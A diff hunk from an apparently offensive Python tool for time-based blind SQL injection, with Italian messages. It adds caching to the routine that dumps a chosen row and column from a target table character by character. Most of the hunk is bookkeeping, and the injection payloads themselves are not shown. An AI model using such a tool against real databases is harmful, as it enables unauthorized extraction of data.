@@ -179,39 +179,54 @@ class BlindSqlITimeExtractor(BlindSQLIExtractorBase):
             print("Errore: è necessario impostare prima la tabella target (funzione set_table_target())")
             return
 
-
-
-        """ class ExtractedDataValues:
-        column_name: Optional[str] = None
-        row_number: Optional[int] = None
-        value_length: int = 0
-        value: Optional[str] = None """
-
-
-
-
-        row_num_str = str(row_num_str)
-        record_length = self.dump_length(
-            f"SELECT LEN({column_name}) FROM {self.extracted_data.target.table_name} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY"
-        )
-        if not record_length:
-            print(
-                f"Errore: non è stato possibile determinare la lunghezza del contenuto della riga {row_num_str} nella colonna {column_name}. Verificare che la tabella '{self.extracted_data.target.table_name}' e la colonna '{column_name}' esistano e che il numero di riga sia corretto."
+        self.extracted_data.target.target_column_name = column_name
+        self.extracted_data.target.target_row_number = row_number
+        n = len(self.extracted_data.target.extracted_values)
+        n_target = n
+        if n > 0:
+            for i, c_n in enumerate(self.extracted_data.target.extracted_values):
+                if c_n.column_name == column_name and c_n.row_number == row_number:
+                    n_target = i
+                    break
+        if n_target == n:
+            self.extracted_data.target.extracted_values.append(
+                ExtractedDataValues(
+                    column_name=column_name,
+                    row_number=row_number,
+                )
             )
-            return
-        print(
-            f"La lunghezza del contenuto della riga {row_num_str} nella colonna {column_name} è: {str(record_length)}"
-        )
+            n_target = len(self.extracted_data.target.extracted_values) - 1
+            self.save_data()
 
+
+        row_num_str = str(row_number)
+        if not self.extracted_data.target.extracted_values[n_target].value_length:
+            record_length = self.dump_length(
+                f"SELECT LEN({column_name}) FROM {self.extracted_data.target.table_name} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY"
+            )
+            if not record_length:
+                print(
+                    f"Errore: non è stato possibile determinare la lunghezza del contenuto della riga {row_num_str} nella colonna {column_name}. Verificare che la tabella '{self.extracted_data.target.table_name}' e la colonna '{column_name}' esistano e che il numero di riga sia corretto."
+                )
+                return
+            print(
+                f"La lunghezza del contenuto della riga {row_num_str} nella colonna {column_name} è: {str(record_length)}"
+            )
+            self.extracted_data.target.extracted_values[n_target].value_length = record_length
+            self.save_data()
+
+        # TODO: migliorare: salvare ogni singolo carattere trovato in modo da poter ripartire da dove si è lasciato (sarebbe da applicare a monte su qualunque dump_string)
         q = f"SELECT {column_name} FROM {self.extracted_data.target.table_name} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY"
         record_content = (
-            self.dump_string_anding(q, record_length)
+            self.dump_string_anding(q, self.extracted_data.target.extracted_values[n_target].value_length)
             if self.settings.optimizer == "anding"
-            else self.dump_string_bisection(q, record_length)
+            else self.dump_string_bisection(q, self.extracted_data.target.extracted_values[n_target].value_length)
         )
         print(f"Il contenuto della riga {row_number} nella colonna {column_name} è: ", end="\r\n")
         print(record_content)
         print("\r\n")
+        self.extracted_data.target.extracted_values[n_target].value = record_content
+        self.save_data()
 
         return record_content
 
